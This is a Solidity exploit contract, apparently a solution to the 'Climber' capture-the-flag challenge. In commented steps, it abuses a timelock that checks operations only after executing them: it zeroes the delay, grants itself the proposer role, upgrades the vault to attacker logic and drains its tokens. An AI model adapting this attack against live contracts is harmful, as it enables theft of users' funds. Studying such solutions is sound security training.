pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../climber/ClimberTimelock.sol";
import "../climber/ClimberVault.sol";

contract customClimberVault is ClimberVault{
    function withdrawAllTokenTo(address tokenAddr, address to) external{
        IERC20 token = IERC20(tokenAddr);
        token.transfer(to, token.balanceOf(address(this)));
    }
}

contract ClimberExploit{
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    address owner;
    bytes32 nonce;

    constructor () {
        owner = msg.sender;
        nonce = bytes32(uint256(1337));
    }

    function exploit(address tokenAddr, address payable timelockAddr, address vaultAddr) external{
        ClimberTimelock timelock = ClimberTimelock(timelockAddr);
        customClimberVault vault = new customClimberVault();
        // STEP 1 - set update delay to 0 to allow scheduling and executing in same tx
        targets.push(timelockAddr);
        dataElements.push(abi.encodeWithSelector(
            timelock.updateDelay.selector, 0));
        /* STEP 2 - add contract to proposers
        timelock contract self is member of ADMIN
        ADMIN is group admin for PROPOSER
        */
        targets.push(timelockAddr);
        dataElements.push(abi.encodeWithSelector(
            timelock.grantRole.selector,
            bytes32(keccak256("PROPOSER_ROLE")),
            address(this)
        ));
        // STEP 3 - schedule current execution via external call - check is performed after
        targets.push(address(this));
        dataElements.push(abi.encodeWithSelector(
            this.scheduler.selector
        ));
        // STEP 4 - upgrade vault logic to defined by attacker
        targets.push(vaultAddr);
        dataElements.push(abi.encodeWithSignature(
            "upgradeTo(address)",
            address(vault)
        ));
        // Steps do not require value
        for(uint i = 0; i < targets.length; i++){values.push(0);}
        // Execute defined steps
        timelock.execute(targets, values, dataElements, nonce);
        // Withdraw tokens to owner
        customClimberVault(vaultAddr).withdrawAllTokenTo(tokenAddr, owner); 
    }

    function scheduler() external{
        // Schedule defined steps
        ClimberTimelock(payable(msg.sender)).schedule(targets, values, dataElements, nonce);
    }
}